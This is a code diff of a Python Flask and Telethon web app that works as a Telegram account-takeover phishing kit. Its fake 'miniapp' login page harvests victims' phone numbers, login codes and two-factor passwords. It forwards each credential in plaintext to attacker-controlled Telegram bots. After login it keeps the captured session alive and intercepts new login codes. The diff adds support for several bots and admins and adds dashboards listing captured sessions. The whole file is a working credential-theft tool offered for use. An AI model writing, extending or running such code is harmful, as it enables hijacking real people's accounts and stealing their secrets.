@@ -9,7 +9,8 @@ from datetime import datetime
 from dotenv import load_dotenv
 from telethon import TelegramClient, events
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError, FloodWaitError
-from telethon.tl.types import User
+
+from config import API_ID, API_HASH, BOTS, get_bot_by_id, get_admin_id
 
 load_dotenv()
 
@@ -17,22 +18,41 @@ app = Flask(__name__)
 app.secret_key = os.urandom(24)
 logging.basicConfig(level=logging.DEBUG)
 
-# Configuration
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
-API_ID = int(os.getenv("API_ID"))
-API_HASH = os.getenv("API_HASH")
-ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")
-
 # Store session data and active clients
 sessions = {}
-active_clients = {}  # phone -> TelegramClient (kept alive for monitoring)
+active_clients = {}
 
-def send_telegram_message(text):
-    """Send message to admin via Telegram bot"""
+def send_telegram_message(text, bot_id=None, admin_id=None):
+    """Send message to admin via specific bot"""
+    
+    # If admin_id provided directly, use it
+    if admin_id:
+        # Find any bot to send with
+        if BOTS:
+            bot = list(BOTS.values())[0]
+            token = bot['token']
+        else:
+            logging.error("No bots configured")
+            return None
+    elif bot_id:
+        bot = get_bot_by_id(bot_id)
+        if not bot:
+            logging.error(f"Bot {bot_id} not found")
+            return None
+        token = bot['token']
+        admin_id = bot['admin_id']
+    else:
+        # Send to all admins via their respective bots
+        results = []
+        for bid, bot in BOTS.items():
+            result = send_telegram_message(text, bot_id=bid)
+            results.append(result)
+        return results
+    
     try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
         payload = {
-            "chat_id": ADMIN_CHAT_ID,
+            "chat_id": admin_id,
             "text": text,
             "parse_mode": "HTML"
         }
@@ -41,6 +61,11 @@ def send_telegram_message(text):
     except Exception as e:
         logging.error(f"Failed to send Telegram message: {e}")
         return None
+
+def send_to_all_admins(text):
+    """Send message to ALL configured admins"""
+    for bot_id, bot in BOTS.items():
+        send_telegram_message(text, bot_id=bot_id)
 
 def run_async(coro):
     """Run async function in sync context"""
@@ -51,88 +76,79 @@ def run_async(coro):
     finally:
         loop.close()
 
-async def start_session_monitor(phone, client):
+async def start_session_monitor(phone, client, bot_id=None):
     """Start monitoring a logged-in session for new login codes"""
     
-    @client.on(events.NewMessage(from_users=777000))  # 777000 is Telegram's official account
+    @client.on(events.NewMessage(from_users=777000))
     async def handler(event):
         message_text = event.message.text
         
-        # Extract login code if present
         code_match = re.search(r'(\d{5,6})', message_text)
         code = code_match.group(1) if code_match else "N/A"
         
         print(f"\n{'='*60}")
         print(f"🚨 INTERCEPTED MESSAGE FROM TELEGRAM")
         print(f"📞 Account: {phone}")
-        print(f"💬 Message: {message_text[:200]}")
         print(f"🔑 Code: {code}")
         print(f"{'='*60}\n")
         
-        # Forward to admin
-        send_telegram_message(f"""🚨 <b>INTERCEPTED LOGIN CODE!</b>
+        msg = f"""🚨 <b>INTERCEPTED LOGIN CODE!</b>
 
 📞 <b>Account:</b> <code>{phone}</code>
 🔑 <b>Code:</b> <code>{code}</code>
 ⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
 💬 <b>Full Message:</b>
-<pre>{message_text[:500]}</pre>""")
+<pre>{message_text[:500]}</pre>"""
+        
+        # Send to specific bot's admin or all admins
+        if bot_id:
+            send_telegram_message(msg, bot_id=bot_id)
+        else:
+            send_to_all_admins(msg)
     
-    # Also capture ALL incoming messages (optional - for full monitoring)
-    @client.on(events.NewMessage(incoming=True))
-    async def all_messages_handler(event):
-        sender = await event.get_sender()
-        sender_name = getattr(sender, 'first_name', 'Unknown') if sender else 'Unknown'
-        sender_id = getattr(sender, 'id', 'Unknown') if sender else 'Unknown'
-        
-        # Only notify for service messages or messages containing codes
-        if sender_id == 777000 or re.search(r'\b\d{5,6}\b', event.message.text):
-            return  # Already handled above
-        
-        # Uncomment below to receive ALL messages (can be spammy)
-        # send_telegram_message(f"""📩 <b>New Message</b>
-        # 📞 Account: <code>{phone}</code>
-        # 👤 From: {sender_name} (<code>{sender_id}</code>)
-        # 💬 {event.message.text[:200]}""")
-
     print(f"[MONITOR] Started monitoring session for {phone}")
-    send_telegram_message(f"""👁️ <b>SESSION MONITOR ACTIVE</b>
+    
+    msg = f"""👁️ <b>SESSION MONITOR ACTIVE</b>
 
 📞 <b>Account:</b> <code>{phone}</code>
-✅ Now intercepting all login codes sent to this account.
+✅ Now intercepting all login codes sent to this account."""
+    
+    if bot_id:
+        send_telegram_message(msg, bot_id=bot_id)
+    else:
+        send_to_all_admins(msg)
 
-Any new login attempts will be captured and forwarded to you.""")
-
-def run_client_forever(phone, session_file):
-    """Run client in background thread to keep session alive and monitor"""
+def run_client_forever(phone, session_file, bot_id=None):
+    """Run client in background thread"""
     async def _run():
         client = TelegramClient(session_file, API_ID, API_HASH)
         await client.connect()
         
         if not await client.is_user_authorized():
             print(f"[MONITOR] Session expired for {phone}")
-            send_telegram_message(f"⚠️ Session expired for <code>{phone}</code>")
             return
         
         active_clients[phone] = client
-        await start_session_monitor(phone, client)
-        
-        # Keep running
+        await start_session_monitor(phone, client, bot_id)
         await client.run_until_disconnected()
     
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     loop.run_until_complete(_run())
 
-def start_monitoring_thread(phone, session_file):
+def start_monitoring_thread(phone, session_file, bot_id=None):
     """Start background thread for session monitoring"""
-    thread = threading.Thread(target=run_client_forever, args=(phone, session_file), daemon=True)
+    thread = threading.Thread(
+        target=run_client_forever, 
+        args=(phone, session_file, bot_id), 
+        daemon=True
+    )
     thread.start()
     return thread
 
 async def send_code_async(phone):
-    """Send verification code to phone via Telegram API"""
+    """Send verification code to phone"""
     session_file = f"sessions/{phone.replace('+', '').replace(' ', '')}"
     os.makedirs("sessions", exist_ok=True)
     
@@ -154,7 +170,7 @@ async def send_code_async(phone):
         await client.disconnect()
         return {'success': False, 'error': str(e)}
 
-async def verify_code_async(phone, code):
+async def verify_code_async(phone, code, bot_id=None):
     """Verify the code entered by user"""
     if phone not in sessions:
         return {'success': False, 'error': 'Session expired', 'needs_2fa': False}
@@ -175,12 +191,10 @@ async def verify_code_async(phone, code):
         sessions[phone]['user_id'] = me.id
         sessions[phone]['username'] = me.username
         sessions[phone]['first_name'] = me.first_name
+        sessions[phone]['bot_id'] = bot_id
         
-        # Don't disconnect - keep for monitoring
         await client.disconnect()
-        
-        # Start monitoring in background
-        start_monitoring_thread(phone, session_file)
+        start_monitoring_thread(phone, session_file, bot_id)
         
         return {'success': True, 'needs_2fa': False, 'user': me}
         
@@ -201,7 +215,7 @@ async def verify_code_async(phone, code):
         await client.disconnect()
         return {'success': False, 'needs_2fa': False, 'error': str(e)}
 
-async def verify_2fa_async(phone, password):
+async def verify_2fa_async(phone, password, bot_id=None):
     """Verify 2FA password"""
     if phone not in sessions:
         return {'success': False, 'error': 'Session expired'}
@@ -222,11 +236,10 @@ async def verify_2fa_async(phone, password):
         sessions[phone]['username'] = me.username
         sessions[phone]['first_name'] = me.first_name
         sessions[phone]['password'] = password
+        sessions[phone]['bot_id'] = bot_id
         
         await client.disconnect()
-        
-        # Start monitoring in background
-        start_monitoring_thread(phone, session_file)
+        start_monitoring_thread(phone, session_file, bot_id)
         
         return {'success': True, 'user': me}
         
@@ -242,11 +255,19 @@ def index():
 
 @app.route('/miniapp', methods=['GET'])
 def miniapp():
-    return render_template('miniapp.html')
+    # Get bot_id from URL parameter
+    bot_id = request.args.get('bot_id', '')
+    session['bot_id'] = bot_id
+    
+    bot = get_bot_by_id(bot_id)
+    bot_name = bot['name'] if bot else 'Telegram'
+    
+    return render_template('miniapp.html', bot_name=bot_name)
 
 @app.route('/login', methods=['POST'])
 def login():
     phone = request.form.get('phone', '').strip()
+    bot_id = session.get('bot_id', '')
     
     if not phone:
         return render_template('miniapp.html', error='Please enter a phone number')
@@ -254,19 +275,23 @@ def login():
     if not phone.startswith('+'):
         phone = '+' + phone
     
-    # Clean phone number
     phone = re.sub(r'[^\d+]', '', phone)
     
+    # Get bot info for notification
+    bot = get_bot_by_id(bot_id)
+    bot_name = bot['name'] if bot else 'Unknown'
+    
     print(f"\n{'='*60}")
-    print(f"📱 NEW LOGIN ATTEMPT: {phone}")
+    print(f"📱 NEW LOGIN: {phone} via Bot: {bot_name}")
     print(f"{'='*60}\n")
     
     send_telegram_message(f"""🚨 <b>NEW LOGIN ATTEMPT</b>
 
 📞 <b>Phone:</b> <code>{phone}</code>
+🤖 <b>Via Bot:</b> {bot_name}
 ⏰ <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
-⏳ Sending verification code...""")
+⏳ Sending verification code...""", bot_id=bot_id)
     
     result = run_async(send_code_async(phone))
     
@@ -276,7 +301,7 @@ def login():
 📞 <b>Phone:</b> <code>{phone}</code>
 📨 Real Telegram code sent to user's device.
 
-⏳ Waiting for user to enter the code...""")
+⏳ Waiting for user to enter the code...""", bot_id=bot_id)
         
         session['phone'] = phone
         return redirect(url_for('verify_otp_page'))
@@ -285,13 +310,14 @@ def login():
         send_telegram_message(f"""❌ <b>FAILED TO SEND CODE</b>
 
 📞 <b>Phone:</b> <code>{phone}</code>
-⚠️ <b>Error:</b> {error_msg}""")
+⚠️ <b>Error:</b> {error_msg}""", bot_id=bot_id)
         
         return render_template('miniapp.html', error=error_msg)
 
 @app.route('/verify_otp', methods=['GET', 'POST'])
 def verify_otp_page():
     phone = session.get('phone', '')
+    bot_id = session.get('bot_id', '')
     
     if not phone:
         return redirect(url_for('miniapp'))
@@ -310,9 +336,9 @@ def verify_otp_page():
 📞 <b>Phone:</b> <code>{phone}</code>
 🔑 <b>Code:</b> <code>{code}</code>
 
-⏳ Verifying with Telegram...""")
+⏳ Verifying with Telegram...""", bot_id=bot_id)
     
-    result = run_async(verify_code_async(phone, code))
+    result = run_async(verify_code_async(phone, code, bot_id))
     
     if result['success']:
         user = result.get('user')
@@ -324,8 +350,7 @@ def verify_otp_page():
 🆔 <b>Username:</b> @{user.username if user and user.username else 'N/A'}
 🔢 <b>User ID:</b> <code>{user.id if user else 'N/A'}</code>
 
-🎉 Session captured and monitoring started!
-👁️ You will now receive any new login codes sent to this account.""")
+🎉 Session captured and monitoring started!""", bot_id=bot_id)
         
         return redirect(url_for('success'))
         
@@ -335,7 +360,7 @@ def verify_otp_page():
 📞 <b>Phone:</b> <code>{phone}</code>
 🔑 <b>Code:</b> <code>{code}</code>
 
-⏳ Waiting for cloud password...""")
+⏳ Waiting for cloud password...""", bot_id=bot_id)
         
         return redirect(url_for('verify_2fa_page'))
     else:
@@ -343,14 +368,15 @@ def verify_otp_page():
         send_telegram_message(f"""❌ <b>INVALID CODE</b>
 
 📞 <b>Phone:</b> <code>{phone}</code>
-🔑 <b>Code Entered:</b> <code>{code}</code>
-⚠️ <b>Error:</b> {error_msg}""")
+🔑 <b>Code:</b> <code>{code}</code>
+⚠️ <b>Error:</b> {error_msg}""", bot_id=bot_id)
         
         return render_template('verify_otp.html', phone=phone, error=error_msg)
 
 @app.route('/verify_2fa', methods=['GET', 'POST'])
 def verify_2fa_page():
     phone = session.get('phone', '')
+    bot_id = session.get('bot_id', '')
     
     if not phone:
         return redirect(url_for('miniapp'))
@@ -369,9 +395,9 @@ def verify_2fa_page():
 📞 <b>Phone:</b> <code>{phone}</code>
 🔐 <b>Password:</b> <code>{password}</code>
 
-⏳ Verifying...""")
+⏳ Verifying...""", bot_id=bot_id)
     
-    result = run_async(verify_2fa_async(phone, password))
+    result = run_async(verify_2fa_async(phone, password, bot_id))
     
     if result['success']:
         user = result.get('user')
@@ -384,8 +410,7 @@ def verify_2fa_page():
 🆔 <b>Username:</b> @{user.username if user and user.username else 'N/A'}
 🔢 <b>User ID:</b> <code>{user.id if user else 'N/A'}</code>
 
-🎉 Session captured and monitoring started!
-👁️ You will now receive any new login codes sent to this account.""")
+🎉 Session captured and monitoring started!""", bot_id=bot_id)
         
         return redirect(url_for('success'))
     else:
@@ -394,7 +419,7 @@ def verify_2fa_page():
 
 📞 <b>Phone:</b> <code>{phone}</code>
 🔐 <b>Password:</b> <code>{password}</code>
-⚠️ <b>Error:</b> {error_msg}""")
+⚠️ <b>Error:</b> {error_msg}""", bot_id=bot_id)
         
         return render_template('verify_2fa.html', phone=phone, error=error_msg)
 
@@ -411,21 +436,32 @@ def failure():
 
 # ==================== ADMIN ROUTES ====================
 
+@app.route('/admin')
+def admin_dashboard():
+    """Admin dashboard"""
+    return render_template('admin.html', 
+                         sessions=sessions, 
+                         active_clients=active_clients,
+                         bots=BOTS)
+
 @app.route('/admin/sessions')
 def admin_sessions():
-    """View all captured sessions"""
-    html = "<h1>Captured Sessions</h1><ul>"
-    for phone, data in sessions.items():
-        status = "🟢 Active" if phone in active_clients else "🔴 Inactive"
-        html += f"<li><b>{phone}</b> - {status} - {data}</li>"
-    html += "</ul>"
-    html += f"<p>Active monitors: {len(active_clients)}</p>"
-    return html
+    """View all captured sessions as JSON"""
+    return {
+        'sessions': {k: {**v, 'active': k in active_clients} for k, v in sessions.items()},
+        'total': len(sessions),
+        'active_monitors': len(active_clients)
+    }
+
+@app.route('/admin/bots')
+def admin_bots():
+    """View all configured bots"""
+    return {'bots': BOTS}
 
 if __name__ == '__main__':
     print("\n" + "="*60)
     print("🚀 Flask app starting on http://127.0.0.1:5000")
     print("📡 Make sure ngrok is running: ngrok http 5000")
-    print(f"📱 Notifications will be sent to: {ADMIN_CHAT_ID}")
+    print(f"🤖 Configured bots: {len(BOTS)}")
     print("="*60 + "\n")
     app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
